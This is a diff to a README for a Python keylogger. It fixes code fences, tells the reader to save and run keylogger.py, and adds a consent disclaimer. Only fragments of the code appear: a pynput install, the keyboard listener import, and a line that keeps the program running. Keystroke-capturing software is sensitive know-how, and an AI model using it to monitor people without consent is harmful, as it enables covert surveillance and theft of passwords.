@@ -18,7 +18,9 @@ Make sure Python is installed, then install the required package using the comma
 
 ```bash
 python -m pip install pynput
-
+```
+Then save the following code as keylogger.py and run it:
+```
 # Import the keyboard listener module from pynput
 from pynput import keyboard
 
@@ -46,3 +48,6 @@ if __name__ == "__main__":
     
     # Keep the program running with user input to prevent it from closing
     input()
+```
+# Disclaimer
+This project is for educational purposes only. Using keyloggers without explicit permission is illegal and unethical. Always ensure you have proper consent before running this or similar software on any device.
